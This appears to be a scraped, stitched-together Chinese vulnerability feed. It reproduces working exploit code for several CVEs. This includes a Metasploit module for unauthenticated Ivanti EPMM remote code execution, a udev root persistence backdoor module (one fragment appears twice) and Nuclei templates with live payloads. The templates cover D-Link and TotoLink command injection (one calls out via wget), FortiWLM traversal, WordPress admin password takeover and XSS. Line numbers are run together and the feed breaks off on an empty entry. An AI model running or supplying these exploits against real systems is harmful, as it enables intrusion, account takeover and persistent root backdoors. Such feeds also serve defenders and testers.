'https://fearsoff.org/research/roundcube' - 'http://www.openwall.com/lists/oss-security/2025/06/02/3' - 'https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10' classification: cvss-metrics: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H' cvss-score: 10 cve-id: CVE-2025-49113 cwe-id: CWE-502 metadata: vendor: roundcube product: webmail tags: 'roundcube,portal,tech'http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers-condition: and matchers: - type: word words: - Roundcube - roundcube condition: or part: body - type: regex regex: - '"rcversion":\d\d\d\d' condition: or part: body extractors: - type: regex name: major group: 1 regex: - '"rcversion":(\d)' internal: true - type: regex name: minor group: 1 regex: - '"rcversion":\d\d(\d)' internal: true - type: regex name: patch group: 1 regex: - '"rcversion":\d\d\d(\d+)' internal: true - type: dsl name: version dsl: - major + "." + minor + "." + patch internal: true - type: dsl name: vulnerable dsl: - >- compare_versions(version, '< 1.5.10') || (compare_versions(version, '>= 1.6.0') && compare_versions(version, '< 1.6.11')) internal: true - type: dsl dsl: - '"Version: " + version'

posts.title: Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution
posts.text: 漏洞名称： Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution 漏洞编号： CVE： CVE-2025-4427, CVE-2025-4428 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： 该模块利用了Ivanti EPMM中的未认证远程代码执行漏洞链，跟踪为CVE-2025-4427和CVE-2025-4428。一个认证缺陷允许未认证访问管理员Web API端点，从而允许通过表达式语言注入执行代码。此模块在’tomcat’用户上下文中执行。此模块也适用于许多版本的MobileIron Core（重新命名为Ivanti EPMM）。 产品厂商： Ivanti 产品名称： Ivanti EPMM 来源： https://github.com/rapid7/metasploit-framework/blob/26156dfac2e01379eb858a87aa85e2ecfea929ff/modules%2Fexploits%2Fmulti%2Fhttp%2Fivanti_epmm_rce_cve_2025_4427_4428.rb 类型： rapid7/metasploit-framework:github commit 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking prepend Msf::Exploit::Remote::AutoCheck include Msf::Exploit::Remote::HttpClient def initialize(info = {}) super( update_info( info, 'Name' => 'Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution', 'Description' => %q{ This module exploits an unauthenticated remote code execution exploit chain for Ivanti EPMM, tracked as CVE-2025-4427 and CVE-2025-4428. An authentication flaw permits unauthenticated access to an administrator web API endpoint, which allows for code execution via expression language injection. This module executes in the context of the 'tomcat' user. This module should also work on many versions of MobileIron Core (rebranded as Ivanti EPMM). }, 'License' => MSF_LICENSE, 'Author' => [ 'CERT-EU', # Original discovery 'Sonny Macdonald', # First Published PoC 'Piotr Bazydlo', # First published PoC 'remmons-r7' # MSF Exploit ], 'References' => [ ['CVE', '2025-4427'], ['CVE', '2025-4428'], # Advisory ['URL', 'https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM?language=en_US'], # First published PoC ['URL', 'https://github.com/watchtowrlabs/watchTowr-vs-Ivanti-EPMM-CVE-2025-4427-CVE-2025-4428'], # Non-blind payload ['URL', 'https://blog.eclecticiq.com/china-nexus-threat-actor-actively-exploiting-ivanti-endpoint-manager-mobile-cve-2025-4428-vulnerability'] ], 'DisclosureDate' => '2025-05-13', # Runs as the 'tomcat' user 'Privileged' => false, 'Platform' => ['python'], 'Arch' => [ARCH_PYTHON], # Tested appliance has Python 3.4.9 'DefaultTarget' => 0, 'Targets' => [ [ 'Default', {} ] ], 'Notes' => { # Confirmed to work multiple times in a row and concurrently 'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS] } ) ) register_options( [ Opt::RPORT(443), OptString.new('TARGETURI', [true, 'The base path to Ivanti EPMM', '/']), OptBool.new('SSL', [true, 'Negotiate SSL/TLS for outgoing connections', true]) ] ) end def check # Execute 'id' to check if target is vulnerable (version check via exploitation, best known approach) resp = execute_command('id') return CheckCode::Unknown('Failed to get a response from the target') unless resp # The response body format will vary across versions, so check for presence of 'id' output if resp.body.include?('uid=') && resp.body.include?('gid=') return CheckCode::Vulnerable('Successfully executed command') else return CheckCode::Safe('Target does not appear to be vulnerable - command output not returned') end end def execute_command(command) payload = "${''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('#{command}').getInputStream()).useDelimiter('%5C%5CA').next()}" vprint_status("Sending template payload: #{payload}") send_request_cgi( 'method' => 'GET', # There are multiple API endpoint targets, but this works on MobileIron Core and the rebranded EPMM 'uri' => normalize_uri(target_uri.path, 'mifs', 'rs', 'api', 'v2', 'featureusage'), 'vars_get' => { 'format' => payload } ) end def exploit vprint_status('Attempting to execute payload') base64_payload = Base64.urlsafe_encode64(payload.encoded) cmd = "python3 -c exec(__import__(\"base64\").b64decode(\"#{base64_payload}\"))" execute_command(cmd) endend

posts.title: D-Link DIR-605 信息泄露漏洞
posts.text: 漏洞名称： D-Link DIR-605 信息泄露漏洞 漏洞编号： CVE： CVE-2021-40655 漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： D-LINK-DIR-605 B2固件版本2.01MT存在信息泄露问题。攻击者可以通过向/getcfg.php页面伪造POST请求获取用户名和密码。 产品厂商： dlink 产品名称： dir-605l_firmware 影响版本： 2.01mt 搜索语法： body=”l_tb>DIR-605” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/f9b97f2ce5bf995bf1fd742daa2cb0f125a8c85e/http%2Fcves%2F2021%2FCVE-2021-40655.yaml 类型： projectdiscovery/nuclei-templates:github issues 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647id: CVE-2021-40655info: name: D-Link DIR-605 - Information Disclosure author: DhiyaneshDK severity: high description: | An informtion disclosure issue exists in D-LINK-DIR-605 B2 Firmware Version - 2.01MT. An attacker can obtain a user name and password by forging a post request to the / getcfg.php page reference: - https://nvd.nist.gov/vuln/detail/cve-2021-40655 - https://github.com/Ilovewomen/D-LINK-DIR-605/ classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N cvss-score: 7.5 cve-id: CVE-2021-40655 cwe-id: CWE-863 epss-score: 0.91874 epss-percentile: 0.99681 cpe: cpe:2.3:o:dlink:dir-605l_firmware:2.01mt:*:*:*:*:*:*:* metadata: vendor: dlink product: dir-605l_firmware fofa-query: body="l_tb>DIR-605" max-request: 1 tags: cve,cve2021,dlink,kev,dir-605,info-leakhttp: - raw: - | POST /getcfg.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Cookie: X-Forwarded-For: 127.0.0.1 SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a matchers: - type: dsl dsl: - 'status_code == 200' - 'contains(content_type, "text/xml")' - 'contains(body, "DEVICE.ACCOUNT")' condition: and

posts.title: Grafana 路径遍历漏洞
posts.text: 漏洞名称： Grafana 路径遍历漏洞 漏洞编号： CVE： CVE-2025-4123 漏洞类型： 目录遍历 漏洞等级： 严重 漏洞描述： CVE-2025-4123是Grafana中的一个严重路径遍历漏洞，影响/public端点。该漏洞允许攻击者进行服务器端请求伪造(SSRF)、本地文件包含(LFI)、开放重定向和跨站脚本(XSS)攻击。 产品厂商： Grafana 产品名称： Grafana 来源： https://github.com/ynsmroztas/CVE-2025-4123-Exploit-Tool-Grafana- 类型： CVE-2025:github search 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758# CVE-2025-4123 - Grafana Path Traversal Exploit> Developed by **mitsec**This is a proof-of-concept (PoC) exploit tool for **CVE-2025-4123**, a critical path traversal vulnerability in Grafana's \`/public\` endpoint. The exploit allows for:- ✅ Server-Side Request Forgery (SSRF)- ✅ Local File Inclusion (LFI)- ✅ Open Redirect- ✅ Cross-Site Scripting (XSS)## 🔥 AffectedGrafana instances with \`/public/\` endpoint improperly handling encoded paths like:\`\`\`/public/..%2F%5coast.pro%2F%3f%2F..%2F..\`\`\`---## 🚀 Usage\`\`\`bashpython3 cve_2025_4123_exploit_mitsec_final.py\`\`\`Then select the desired mode:1. SSRF - Internal services like \`169.254.169.254\`2. LFI - Read files like \`/etc/passwd\`3. Open Redirect - Redirect to external domains4. XSS - JavaScript injection in public path---## 🧪 Example\`\`\`bash[*] SSRF URL: http://127.0.0.1:3000/public/..%2F%5C169.254.169.254/latest/meta-data/%2F%3f%2F..%2F..[*] LFI URL: http://127.0.0.1:3000/public/..%2F%5coast.pro%2F%3f%2F..%2F..%2F..%2Fetc%2Fpasswd[*] XSS URL: http://127.0.0.1:3000/public/%3Cscript%3Ealert('mitsec')%3C%2Fscript%3E\`\`\`---## 📄 DisclaimerThis code is provided for educational and authorized testing purposes only. Unauthorized use against systems without consent is illegal.---## ✍️ Author- [mitsec](https://github.com/ynsmroztas) - Grafana.jpg - README.md - cve_2025_4123_exploit-mitsec.py```

posts.text: 漏洞名称： D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection 漏洞编号： CVE： CVE-2023-25280 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： D-Link DIR820LA1_FW105B03存在操作系统命令注入漏洞，攻击者可以通过向ping.ccp发送带有ping_addr参数的精心构造的负载，将权限提升至root。 产品厂商： dlink 产品名称： dir820la1_firmware 影响版本： 105b03 来源： https://github.com/projectdiscovery/nuclei-templates/blob/6af1a98950753143612ca965da48706e2fbc2d45/http%2Fcves%2F2023%2FCVE-2023-25280.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758id: CVE-2023-25280info: name: D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection author: pussycat0x severity: critical description: | OS Command injection vulnerability in D-Link DIR820LA1_FW105B03 allows attackers to escalate privileges to root via a crafted payload with the ping_addr parameter to ping.ccp. reference: - https://github.com/migraine-sudo/D_Link_Vuln/tree/main/cmd%20Inject%20in%20pingV4Msg - https://www.dlink.com/en/security-bulletin/ - https://github.com/Ostorlab/KEV classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2023-25280 cwe-id: CWE-78 epss-score: 0.8918 epss-percentile: 0.99516 cpe: cpe:2.3:o:dlink:dir820la1_firmware:105b03:*:*:*:*:*:*:* metadata: vendor: dlink product: dir820la1_firmware tags: cve,cve2023,rce,unauth,kev,dlinkvariables: payload: "wget http://{{interactsh-url}}"http: - raw: - | POST /ping.ccp HTTP/1.1 Host: {{Hostname}} Content-Length: 760 Accept: application/xml, text/xml, */*; q=0.01 X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded Origin: http://{{RootURL}} Referer: http://{{BaseURL}}/lan.asp Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: hasLogin=1 Connection: close ccp_act=pingV4Msg&ping_addr=%0a{{payload}}%0a matchers-condition: and matchers: - type: word part: interactsh_protocol words: - "http" - type: status status: - 200

posts.title: udev persistence
posts.text: 漏洞名称： udev persistence 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 此模块将在/lib/udev/rules.d/中添加一个脚本，以便执行磁盘上的payload。每次网络接口（除了l0）启动时，它将以root权限执行。 产品名称： udev 来源： https://github.com/rapid7/metasploit-framework/blob/5fbf46ba7f99c77a91bc7e7de757e1f91258fb84/modules%2Fexploits%2Flinux%2Flocal%2Fudev_persistence.rb 类型： rapid7/metasploit-framework:github commit 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Local Rank = GreatRanking include Msf::Post::File include Msf::Post::Unix def initialize(info = {}) super( update_info( info, 'Name' => 'udev persistence', 'Description' => %q{ This module will add a script in /lib/udev/rules.d/ in order to execute a payload written on disk. It'll be executed with root privileges everytime a network interface other than l0 comes up. }, 'License' => MSF_LICENSE, 'Author' => [ 'Julien Voisin' ], 'Platform' => [ 'unix', 'linux' ], 'Arch' => ARCH_CMD, 'SessionTypes' => [ 'shell', 'meterpreter' ], 'DefaultOptions' => { 'WfsDelay' => 90_000 }, 'Targets' => [ ['Automatic', {}] ], 'DefaultTarget' => 0, 'DisclosureDate' => '1999-01-01', 'Passive' => true, 'Stance' => Msf::Exploit::Stance::Passive, 'Notes' => { 'Stability' => [], 'Reliability' => [EVENT_DEPENDENT], 'SideEffects' => [ARTIFACTS_ON_DISK] }, 'References' => [ ['URL', 'https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp'], ['URL', 'https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/'], ] ) ) register_options([ OptString.new('PAYLOAD_PATH', [false, 'The payload\'s path on disk', '']), OptString.new('BACKDOOR_PATH', [false, 'The backdoor\'s path on disk', '']) ]) end def get_command unless executable? '/usr/bin/at' fail_with Failure::BadConfig, 'The required /usr/bin/at binary was not found on the target' end %(/usr/bin/at -M -f #{@payload_path} now) end def exploit @payload_path = datastore['PAYLOAD_PATH'].blank? ? '/usr/bin/' + Rex::Text.rand_text_alphanumeric(8) : datastore['PAYLOAD_PATH'] @backdoor_path = datastore['BACKDOOR_PATH'].blank? ? '/lib/udev/rules.d/' + Rex::Text.rand_text_alphanumeric(8) + '.rules' : datastore['BACKDOOR_PATH'] unless writable? File.dirname(@backdoor_path) fail_with Failure::BadConfig, "#{@backdoor_path} is not writable" end if exists? @backdoor_path fail_with Failure::BadConfig, "#{@backdoor_path} is already present" end unless writable? File.dirname(@payload_path) fail_with Failure::BadConfig, "#{@payload_path} is not writable" end if exists? @payload_path fail_with Failure::BadConfig, "#{@payload_path} is already present" end upload_and_chmodx(@payload_path, "#!/bin/sh\n#{payload.encoded}") print_status "#{@payload_path} written" fail_with Failure::PayloadFailed, 'Failed to write UDEV file' unless write_file(@backdoor_path, %(SUBSYSTEM=="net", KERNEL!="lo", RUN+="#{get_command}")) print_status "#{@backdoor_path} written" # need to trigger first rule manually print_status 'Triggering udev rule' cmd_exec('udevadm trigger -v --subsystem-match=net') stime = Time.now.to_f timeout = datastore['ListenerTimeout'].to_i loop do break if timeout > 0 && (stime + timeout < Time.now.to_f) Rex::ThreadSafe.sleep(1) end endend

'/usr/bin/at' fail_with Failure::BadConfig, 'The required /usr/bin/at binary was not found on the target' end %(/usr/bin/at -M -f #{@payload_path} now) end def exploit @payload_path = datastore['PAYLOAD_PATH'].blank? ? '/usr/bin/' + Rex::Text.rand_text_alphanumeric(8) : datastore['PAYLOAD_PATH'] @backdoor_path = datastore['BACKDOOR_PATH'].blank? ? File.dirname(@payload_path) fail_with Failure::BadConfig, "#{@payload_path} is not writable" end if exists? @payload_path fail_with Failure::BadConfig, "#{@payload_path} is already present" end upload_and_chmodx(@payload_path, "#!/bin/sh\n#{payload.encoded}") print_status "#{@payload_path} written" fail_with Failure::PayloadFailed, 'Failed to write UDEV file' unless write_file(@backdoor_path, %(SUBSYSTEM=="net", KERNEL!="lo", RUN+="#{get_command}")) print_status "#{@backdoor_path} written" # need to trigger first rule manually print_status 'Triggering udev rule' cmd_exec('udevadm trigger -v --subsystem-match=net') stime = Time.now.to_f timeout = datastore['ListenerTimeout'].to_i loop do break if timeout > 0 && (stime + timeout < Time.now.to_f) Rex::ThreadSafe.sleep(1) end endend

posts.title: TotoLink Router setMacFilterRules - Command Injection
posts.text: 漏洞名称： TotoLink Router setMacFilterRules - Command Injection 漏洞编号： CVE： CVE-2024-24328 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： TotoLink Router的’setMacFilterRules’功能存在命令注入漏洞，允许未经授权的攻击者执行任意命令。 产品厂商： totolink 产品名称： a3300r_firmware 影响版本： 17.0.0cu.557_b20221024 搜索语法： title=”totolink” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/b1ec88434ccfe3dde93757d235e0f99185c9c2ea/http%2Fcves%2F2024%2FCVE-2024-24328.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758id: CVE-2024-24328info: name: TotoLink Router setMacFilterRules - Command Injection author: pussycat0x severity: critical description: | This template checks for a command injection vulnerability in TotoLink Router's 'setMacFilterRules' functionality. The vulnerability allows unauthorized attackers to execute arbitrary commands. reference: - https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/12/TOTOlink%20A3300R%20setMacFilterRules.md classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2024-24328 cwe-id: CWE-78 epss-score: 0.01075 epss-percentile: 0.76644 cpe: cpe:2.3:o:totolink:a3300r_firmware:17.0.0cu.557_b20221024:*:*:*:*:*:*:* metadata: vendor: totolink product: a3300r_firmware fofa-query: title="totolink" tags: cve,cve2024,kev,totolink,routers,unauth,intrusivehttp: - raw: - | POST /cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1 Host: {{Hostname}} Content-Length: 83 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest Origin: http://{{BaseURL}} Referer: http://{{RootURL}}/advance/portfwd.html?token=C6F41C563E86A379 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close {"enable":"1`ls>/web/{{randstr}}.txt`","addEffect":"0","topicurl":"setMacFilterRules"} - | GET /{{randstr}}.txt HTTP/1.1 Host: {{Hostname}} Referer: http://{{Hostname}}/advance/portfwd.html?token=C6F41C563E86A379 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close matchers: - type: dsl dsl: - 'status_code_1 == 200 && status_code_2 == 200' - 'contains(body_1, ""success":true") && contains(body_2, "bin") && contains(body_2, "etc")' condition: and

posts.text: 漏洞名称： TI WooCommerce Wishlist 未授权访问漏洞 漏洞编号： CVE： CVE-2025-47577 漏洞类型： 未授权访问 漏洞等级： 严重 漏洞描述： TI WooCommerce Wishlist插件中存在一个未授权访问漏洞，攻击者可以利用此漏洞在未授权的情况下执行某些操作。该漏洞的利用需要WooCommerce、TI WooCommerce Wishlist和WC fields Factory插件在WordPress站点上处于活动状态。 产品厂商： TI 产品名称： TI WooCommerce Wishlist 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12251 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516### Is there an existing template for this?- [x] I have searched the existing templates.### Template requests- CVE-2025-47577### Anything else?- Exploit: https://github.com/Yucaerin/CVE-2025-47577- Blog Post: https://patchstack.com/articles/unpatched-critical-vulnerability-in-ti-woocommerce-wishlist-plugin/- To reproduce the vulnerability, the following plugins must be active on the WordPress site: WooCommerce, TI WooCommerce Wishlist, WC fields Factory.

posts.title: FortiWLM 目录遍历漏洞
posts.text: 漏洞名称： FortiWLM 目录遍历漏洞 漏洞编号： CVE： CVE-2023-34990 漏洞类型： 目录遍历 漏洞等级： 严重 漏洞描述： Fortinet FortiWLM版本8.6.0至8.6.5和8.5.0至8.5.4中存在相对路径遍历漏洞，攻击者可通过特制的web请求执行未授权的代码或命令。 产品厂商： Fortinet 产品名称： FortiWLM 影响版本： 8.6.0 <= version <= 8.6.5, 8.5.0 <= version <= 8.5.4 搜索语法： title:”FortiWLM Login” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/aef470b7cd348f30f72ede35a7832a0a179838a3/http%2Fcves%2F2023%2FCVE-2023-34990.yaml 类型： projectdiscovery/nuclei-templates:github issues 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556id: CVE-2023-34990info: name: FortiWLM - Directory Traversal author: DhiyaneshDk severity: critical description: | A relative path traversal in Fortinet FortiWLM version 8.6.0 through 8.6.5 and 8.5.0 through 8.5.4 allows attacker to execute unauthorized code or commands via specially crafted web requests. reference: - https://fortiguard.com/psirt/FG-IR-23-144 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2023-34990 cwe-id: CWE-94,CWE-23 epss-score: 0.00272 epss-percentile: 0.50596 metadata: max-request: 1 shodan-query: title:"FortiWLM Login" tags: cve,cve2023,fortiwlm,lfi,cisaflow: http(1) && http(2)http: - raw: - | GET /wlm/login?next=/wlm HTTP/1.1 Host: {{Hostname}} matchers: - type: dsl internal: true dsl: - 'status_code == 200' - 'contains(body, "<title>FortiWLM Login</title>")' condition: and - raw: - | GET /ems/cgi-bin/ezrf_lighttpd.cgi?op_type=upgradelogs&imagename=../../../../../../../../../data/apps/nms/logs/httpd_error_log HTTP/1.1 Host: {{Hostname}} matchers-condition: and matchers: - type: regex part: response regex: - 'sessionid=([A-F0-9]+)' - type: status status: - 200

posts.title: Motors 未授权权限提升漏洞
posts.text: 漏洞名称： Motors 未授权权限提升漏洞 漏洞编号： CVE： CVE-2025-4322 漏洞类型： 权限提升 漏洞等级： 严重 漏洞描述： WordPress的Motors主题在5.6.67及之前的所有版本中存在权限提升漏洞，攻击者可以在未经身份验证的情况下通过更新任意用户密码（包括管理员密码）来接管账户，从而获得对账户的访问权限。 产品厂商： WordPress 产品名称： Motors theme for WordPress 影响版本： version <= 5.6.67 搜索语法： body=”/wp-content/themes/motors/style.css” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/793fcc09ae3ea4d46e5fe32d8c93e7430b3e5d69/http%2Fcves%2F2025%2FCVE-2025-4322.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061id: CVE-2025-4322info: name: Motors <= 5.6.67 - Unauthenticated Privilege Escalation via Password Update/Account Takeover author: DhiyaneshDK severity: critical description: | The Motors theme for WordPress is vulnerable to privilege escalation via account takeover in all versions up to, and including, 5.6.67. This is due to the theme not properly validating a user's identity prior to updating their password. This makes it possible for unauthenticated attackers to change arbitrary user passwords, including those of administrators, and leverage that to gain access to their account. reference: - http://themeforest.net/item/motors-car-dealership-wordpress-theme/13987211 - https://www.wordfence.com/threat-intel/vulnerabilities/id/61820ca5-5548-4155-b350-df3db1bc1661?source=cve - https://github.com/Yucaerin/CVE-2025-4322 - https://github.com/maximo896/CVE-2025-4322 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2025-4322 cwe-id: CWE-620 epss-score: 0.00097 epss-percentile: 0.28303 metadata: fofa-query: body="/wp-content/themes/motors/style.css" tags: cve,cve2025,motor,intrusive,wordpress,wp-theme,wpvariables: password: "{{rand_text_alphanumeric(12)}}"http: - raw: - | POST {{paths}}/?user_id=1&hash_check=%25C0 HTTP/2 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded stm_new_password={{password}} payloads: paths: - "/login" - "/loginregister" - "/login-register" - "/my-account" - "/account" - "/signin" - "/sign-in" - "/register" - "/auth" - "/user/login" - "/user/signin" - "/forgot-password" - "/reset-password" matchers: - type: dsl dsl: - 'status_code == 200' - 'contains_all(body, "Enter new password","stm-validation-message")' condition: and

posts.title: udev persistence
posts.text: 漏洞名称： udev persistence 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 该模块将在/lib/udev/rules.d/中添加一个脚本，以便执行磁盘上的有效载荷。每次网络接口（除l0外）启动时，该脚本将以root权限执行。 产品名称： udev 来源： https://github.com/rapid7/metasploit-framework/blob/b2ad59d0aa8e3eaced198c5cdaf4cb039a7acc7e/modules%2Fexploits%2Flinux%2Flocal%2Fudev_persistence.rb 类型： rapid7/metasploit-framework:github issues 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Local include Msf::Post::File include Msf::Post::Unix def initialize(info = {}) super( update_info( info, 'Name' => 'udev persistence', 'Description' => %q{ This module will add a script in /lib/udev/rules.d/ in order to execute a payload written on disk. It'll be executed with root privileges everytime a network interface other than l0 comes up. }, 'License' => MSF_LICENSE, 'Author' => [ 'Julien Voisin' ], 'Platform' => [ 'unix', 'linux' ], 'Arch' => ARCH_CMD, 'SessionTypes' => [ 'shell', 'meterpreter' ], 'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true }, 'Targets' => [ ['Automatic', {}] ], 'DefaultTarget' => 0, 'DisclosureDate' => '1999-01-01', 'Notes' => { 'Stability' => [], 'Reliability' => [EVENT_DEPENDENT], 'SideEffects' => [ARTIFACTS_ON_DISK] }, 'References' => [ ['URL', 'https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp'], ['URL', 'https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/'], ] ) ) register_options([ OptString.new('PAYLOAD_PATH', [true, 'The payload\'s path on disk', '/usr/bin/udev-check-updates']) ]) register_options([ OptString.new('BACKDOOR_PATH', [true, 'The backdoor\'s path on disk', '/lib/udev/rules.d/99-update.rules']) ]) end def exploit unless executable? '/usr/bin/at' fail_with Failure::BadConfig, 'The required /usr/bin/at binary was not found on the target' end unless writable? File.dirname(datastore['BACKDOOR_PATH']) fail_with Failure::BadConfig, "#{datastore['BACKDOOR_PATH']} is not writable" end if exists? datastore['BACKDOOR_PATH'] fail_with Failure::BadConfig, "#{datastore['BACKDOOR_PATH']} is already present" end unless writable? File.dirname(datastore['PAYLOAD_PATH']) fail_with Failure::BadConfig, "#{datastore['PAYLOAD_PATH']} is not writable" end if exists? datastore['PAYLOAD_PATH'] fail_with Failure::BadConfig, "#{datastore['PAYLOAD_PATH']} is already present" end upload_and_chmodx(datastore['PAYLOAD_PATH'], "#!/bin/sh\n#{payload.encoded}") print_status "#{datastore['PAYLOAD_PATH']} written" write_file(datastore['BACKDOOR_PATH'], 'SUBSYSTEM=="net", KERNEL!="lo", RUN+="/usr/bin/at -M -f ' + datastore['PAYLOAD_PATH'] + ' now"') print_status "#{datastore['BACKDOOR_PATH']} written" endend

posts.title: ProfilePress 跨站可执行脚本漏洞
posts.text: 漏洞名称： ProfilePress 跨站可执行脚本漏洞 漏洞编号： CVE： CVE-2021-24522 漏洞类型： 跨站可执行脚本 漏洞等级： 中危 漏洞描述： WordPress的ProfilePress插件在3.1.11版本之前存在未认证的反射型跨站脚本(XSS)漏洞，攻击者可以通过tabbed-login-name参数注入任意JavaScript代码。 产品厂商： ProfilePress 产品名称： ProfilePress 影响版本： < 3.1.11 搜索语法： body=”wp-content/plugins/wp-user-avatar” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/6d468508c709a1f16165d25324a0d82d98423f17/http%2Fcves%2F2021%2FCVE-2021-24522.yaml 类型： projectdiscovery/nuclei-templates:github issues 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869id: CVE-2021-24522info: name: ProfilePress < 3.1.11 - Cross-Site Scripting author: ritikchaddha severity: medium description: | The ProfilePress plugin for WordPress before 3.1.11 is vulnerable to unauthenticated reflected cross-site scripting (XSS) via the tabbed login/register widget due to improper escaping of user input. Attackers can inject arbitrary JavaScript via the tabbed-login-name parameter. remediation: | Update the ProfilePress plugin to version 3.1.11 or later. reference: - https://wpscan.com/vulnerability/25b51add-197c-4aff-b1a8-b92fb11d8697/ - https://plugins.trac.wordpress.org/changeset/2561271/wp-user-avatar - https://nvd.nist.gov/vuln/detail/CVE-2021-24522 classification: cve-id: CVE-2021-24522 cwe-id: CWE-79 cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N cvss-score: 5.4 metadata: max-request: 2 fofa-query: body="wp-content/plugins/wp-user-avatar" tags: cve,cve2021,wordpress,wp,wp-plugin,wp-user-avatar,profilepress,xssflow: http(1) && http(2)http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers: - type: word part: body words: - 'wp-user-avatar' internal: true - raw: - | GET {{path}}/?tabbed-login-name="><script>alert(document.domain)</script> HTTP/1.1 Host: {{Hostname}} payloads: path: - / - /wp-login - /wp-login.php host-redirects: true matchers-condition: and matchers: - type: word part: body words: - '<script>alert(document.domain)</script>' - type: word part: content_type words: - text/html - type: status status: - 200

posts.title: Jan 任意文件读取漏洞
